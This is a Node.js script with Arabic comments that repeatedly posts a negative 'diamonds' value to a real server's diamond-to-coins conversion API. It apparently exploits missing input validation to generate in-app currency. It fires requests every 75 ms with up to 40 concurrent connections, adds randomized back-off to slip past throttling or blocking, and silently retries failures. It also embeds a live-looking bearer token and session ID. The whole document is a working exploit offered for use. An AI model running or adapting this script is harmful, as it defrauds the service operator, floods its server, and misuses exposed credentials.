const axios = require('axios');
const http = require('http');

// إعدادات طلب الـ API الأساسي الخاص بك
const url = "http://147.93.20.67/api/convert/diamondToCoins";
const headers = {
    "Authorization": "Bearer 230607|dOBrAYn2anIAPTPeTxkaoOMExeooT5OyzZ9HC3Qec2e16b0a",
    "Accept": "application/json",
    "Accept-Charset": "UTF-8",
    "User-Agent": "ktor-client",
    "Content-Type": "application/json",
    "Host": "147.93.20.67",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "sessionId": "073ef2eb-f0d9-42a2-9f5f-96f580917c16"
};
const payload = { "diamonds": -4.595995949488448 };

// تحسين أداء قنوات التوصيل لمنع أخطاء الـ Connection وتوفير أقصى سرعة
const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 150, maxFreeSockets: 50, timeout: 60000 });

// العدادات وحالة الحظر
let stats = { success: 0, failed: 0, total: 0, isThrottled: false, activeConnections: 0 };
const MAX_CONCURRENT = 40; 

// دالة لطباعة الإحصائيات الدورية كل 5 ثوانٍ في الـ Logs لتجنب امتلاء الشاشة بنصوص مكررة
setInterval(() => {
    console.log(`[تحديث] إجمالي المحاولات: ${stats.total} | ناجح: ${stats.success} | فاشل: ${stats.failed} | الاتصالات النشطة: ${stats.activeConnections} | وضع التهدئة: ${stats.isThrottled ? 'نشط ⚠️' : 'خامل ✓'}`);
}, 5000);

async function sendRequest(id) {
    if (stats.isThrottled) {
        // تأخير عشوائي ذكي في حال رصد ضغط أو حظر من السيرفر لتفادي الإغلاق التام
        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1500));
    }

    stats.activeConnections++;
    stats.total++;

    try {
        const response = await axios.post(url, payload, { 
            headers: headers, 
            httpAgent: httpAgent, 
            timeout: 20000 
        });
        
        if (response.status === 200) {
            stats.isThrottled = false;
            stats.success++;
            // طباعة عينات من النجاح كل 50 طلب لتعرف أن التدفق مستمر بنجاح
            if (id % 50 === 0) {
                console.log(`🚀 طلب #${id} نجح تماماً (الحالة 200)`);
            }
        }
    } catch (error) {
        stats.failed++;
        const errorCode = error.code || (error.response ? error.response.status : 'TIMEOUT');
        
        if (!stats.isThrottled) {
            stats.isThrottled = true;
            console.log(`⚠️ تنبيه: تم رصد ضغط أو حظر من السيرفر (${errorCode}). تفعيل وضع التراجع الذكي حركياً...`);
        }
        
        // محاولة إنقاذ صامتة وسريعة في الخلفية للطلب الفاشل
        setTimeout(async () => {
            try {
                await axios.post(url, payload, { headers: headers, httpAgent: httpAgent, timeout: 25000 });
                stats.success++;
                stats.failed--;
            } catch (rErr) {}
        }, Math.random() * 3000 + 2000);
    } finally {
        stats.activeConnections--;
    }
}

// تشغيل المحرك التكراري بفواصل زمنية فائقة السرعة (75 ميلي ثانية)
let requestCounter = 1;
console.log("⚡ تم إطلاق محرك الخلفية المستمر بنجاح. راقب الإحصائيات بالأسفل...");

setInterval(() => {
    if (stats.activeConnections < MAX_CONCURRENT) {
        sendRequest(requestCounter++);
    }
}, 75);